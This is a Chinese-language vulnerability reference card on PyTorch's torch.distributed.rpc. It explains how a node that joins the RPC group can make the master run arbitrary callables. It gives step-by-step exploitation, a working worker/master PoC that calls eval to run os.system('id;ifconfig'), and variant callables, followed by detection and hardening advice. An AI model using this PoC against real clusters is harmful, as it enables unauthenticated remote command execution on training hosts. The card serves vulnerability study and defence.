---
id: web-python-framework-pytorch-rpc-arbitrary-function-call-rce
title: PyTorch distributed RPC 任意函数调用：加入集群的 worker 通过 rpc_sync 让 master 执行 eval 等任意可调用对象
type: scenario
domain: web
path: web/python/framework
technique: pytorch-rpc-pythonudf-arbitrary-callable-rce
aliases:
- PyTorch RPC 命令注入
- torch.distributed.rpc
- rpc_sync eval
- PythonUDF 任意函数
- _run_function 无校验执行
tags:
- pytorch
- rpc
- distributed
- arbitrary-function-call
- rce
- python
- ai-framework
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: <= 2.2.2（原文称 PyTorch 2.2.2 及以下；文章实测 2.4.1 仍可触发）
verification:
  verified_by: verifier-V245
  verified_at: '2026-11-07T12:53:31+08:00'
  notes: 已对照原文与51张图核对：worker rpc_sync('master', eval, args=('__import__("os").system("id;ifconfig")',))（图14/20/21）→ master 回显 uid=0(root)+ifconfig（图04）；发送链 _invoke_rpc→serialize(PythonUDF)→_invoke_rpc_python_udf→init.cpp pyRpcPythonUdf→python_functions.cpp→sendMessageWithAutograd（图05/17/22-24/30）与接收执行链 RequestCallback→processPythonCall→runPythonFunction→runPythonUdf→_run_function 执行 python_udf.func(*args,**kwargs)（图31-50）均与卡一致；原文称影响2.2.2及以下，图51显示2.4.1仍可触发，affected_versions已按原文标记。dup-scan 判与反序列化卡 likely_duplicate：按原文两卡为“两个漏洞”，本卡 sink 在 _run_function 执行任意可调用对象，另一卡 sink 在 unpickler.load() 反序列化阶段，载荷/修复不同，不属同一链，保留并列。未验证点：未复跑；pip 显示源码版本 2.2.0a0+git39901f2。
---

## 一句话结论

PyTorch `torch.distributed.rpc` 不校验 RPC 调用方要求执行的可调用对象：任何成功加入 RPC 组的节点都能用 `rpc_sync("master", eval, args=('__import__("os").system("id")',))` 把 `eval`、`os.system` 等任意函数放进 `PythonUDF` 发给对端，对端反序列化后在 `_run_function` 中直接执行 `python_udf.func(*args, **kwargs)`，从而以 master 进程权限执行命令；原文称影响 PyTorch 2.2.2 及以下，文章实测 2.4.1 仍可复现。

## 原理

- **RPC 调用链（发送端）**：`rpc_sync`/`rpc_async` 都调用 `torch/distributed/rpc/api.py` 的 `_invoke_rpc(to, func, ...)`。当 `func` 不是 TorchScript builtin/ScriptFunction 时走 `else` 分支，把 `PythonUDF(func, args, kwargs)` 交给 `_default_pickler.serialize`，再调用 `_invoke_rpc_python_udf`（C++ 绑定）。
- **C++ 发送**：`torch/csrc/distributed/rpc/init.cpp` 把 `_invoke_rpc_python_udf` 绑定到 `pyRpcPythonUdf`；`python_functions.cpp` 把序列化载荷与张量封装为 `SerializedPyObj`/`PythonCall`，再经 `sendMessageWithAutograd` 由 `RpcAgent` 发往目标节点。
- **接收与执行**：master 的 `TensorPipeAgent::onListenerAccepted` → `respond` → `RequestCallback::processMessage` → `deserializePythonRpcCommand`；`MessageType::PYTHON_CALL` 被包装为 `UnpickledPythonCall`，随后 `processPythonCall` → `runPythonFunction` → `PythonRpcHandler::runPythonUdf` → Python 层 `torch.distributed.rpc.internal._run_function`。
- **缺失的校验**：`_run_function` 的实现是 `result = python_udf.func(*python_udf.args, **python_udf.kwargs)`，既不检查 `func` 是否是本次训练预期的函数，也不限制 `eval`、`exec`、`os.system` 等危险可调用对象。RPC 框架的设计假设是“集群内节点可信”，因此在可信边界之外，任何能加入组网的节点都可执行任意 Python 函数。
- **为什么能加入**：RPC 组网只依赖节点名/rank/world_size 与 `init_method`（如 `tcp://master:29500`），没有认证或授权；在暴露到不可信网络、多租户集群或某个 worker 已被攻陷的场景，攻击者可以冒充/新增一个 worker 加入组。
- **成立条件**：目标 master 已 `init_rpc` 并保持运行；攻击者能连到 master 的 TensorPipe/Gloo 监听端口并加入同一 RPC 组（world_size/rank 匹配）；双方 PyTorch 版本/编译情况尽量一致，避免 API 不兼容。

## 触发条件

- PyTorch 版本在原文标记范围（2.2.2 及以下；2.4.1 实测仍可触发）。
- 集群使用 `torch.distributed.rpc.init_rpc` 暴露 RPC 监听端口，且端口可被攻击者网络访问。
- RPC 组没有额外认证/白名单；攻击者能以一个合法 `name`/`rank` 加入 `world_size`。
- master 上存在任何危险可调用对象（Python 内置 `eval`/`exec`、`os.system`、`subprocess.*` 等）可被引用执行。

## 利用步骤

1. 确认目标 master 的 RPC 初始化地址与端口（`TensorPipeRpcBackendOptions(init_method="tcp://<master>:<port>")`）；确认自身能访问该端口。
2. 以 worker 身份 `init_rpc(name="worker", rank=1, world_size=2, ...)` 加入同一组（rank/name 需与 master 的 world_size 配置一致）。
3. 调用 `rpc_sync("master", eval, args=('__import__("os").system("id;ifconfig")',))`；`eval` 会被当作普通 Python 可调用对象序列化进 `PythonUDF`。
4. master 收到 `PYTHON_CALL` 后反序列化并 `_run_function` 执行 `eval(...)`，命令以 master 进程用户权限运行；返回值/异常可经 RPC 响应回传给 worker。
5. 若 `eval` 不可用，可换 `exec`、`os.system`、`subprocess.check_output` 等任意可调用对象；也可调用业务函数造成数据破坏/横向移动。
6. 用最小命令（`id`/`whoami`）验证，再评估权限与后续横向路径；清理 RPC 连接/进程。

## PoC

```python
# master.py：正常初始化并保持监听（原文示例）
import time
import torch.distributed.rpc as rpc

options = rpc.TensorPipeRpcBackendOptions(init_method="tcp://192.168.140.210:29500")
rpc.init_rpc(name="master", rank=0, world_size=2, rpc_backend_options=options)
print("Master node initialized")
time.sleep(60)
rpc.shutdown()
```

```python
# worker.py：加入后让 master 执行 eval -> os.system
import torch.distributed.rpc as rpc

options = rpc.TensorPipeRpcBackendOptions(init_method="tcp://192.168.140.210:29500")
rpc.init_rpc(name="worker", rank=1, world_size=2, rpc_backend_options=options)

result = rpc.rpc_sync("master", eval, args=('__import__("os").system("id;ifconfig")',))
print("result:", result)  # master 端命令输出会出现在 master 控制台
rpc.shutdown()
```

说明：以上为原文实验环境的最小复现，仅在授权环境使用；原文 master 端命令以 root 执行并回显 `uid=0(root) ...`。

## 变体与关联

- **直接调用危险内置**：`eval`/`exec`/`compile` 是最短路径；也可传 `os.system`、`subprocess.Popen`、`builtins.__import__` 等。
- **调用业务函数**：即使没有危险内置，攻击者也能调用 master 上已注册的训练/管理函数，读取模型、篡改参数或触发文件/网络操作，形成数据投毒或横向移动。
- **与反序列化卡组合**：若 `func` 不是合法可调用对象而是恶意 pickle 对象，则走 [[web-python-deserialization-pytorch-rpc-pythonudf-unpickler-rce]] 的 `unpickler.load()` sink；两卡共享“加入 RPC 组”这一前置条件。
- **环境变体**：TensorPipe、Gloo 等后端只影响传输层，`PythonUDF` 的序列化/执行逻辑相同；版本不一致时 API 可能不兼容，攻击前需对齐。
- **边界**：官方将 RPC 模块定位为可信集群内使用，若部署方已做网络隔离/认证（mTLS、防火墙、专用 VPC），攻击者无法加入组时链路不成立。

## 检测与防御

- **网络**：RPC 监听端口不应暴露到不可信网络；对 `init_method` 地址做绑定与防火墙白名单，多租户环境使用独立网络命名空间/VPC。
- **认证**：在 RPC 层之前增加节点认证/授权（mTLS、预共享凭据、服务网格），不要仅依赖 rank/name。
- **代码**：不要把 `eval`/`exec`/`os.system` 等可调用对象暴露给 RPC；若必须调用业务函数，使用显式 allowlist（函数名到实现的映射）并校验参数类型/范围。
- **运行**：master 以最小权限运行；监控 RPC 组中新出现的异常 rank/name、短连接与非常规调用函数。
- **检测思路**：审计 `_run_function` 调用点、RPC 消息中的 `PythonUDF.func` 是否为预期函数；对 `rpc_sync(..., eval, ...)`、`os.system`/`subprocess` 等组合做代码与日志检测。
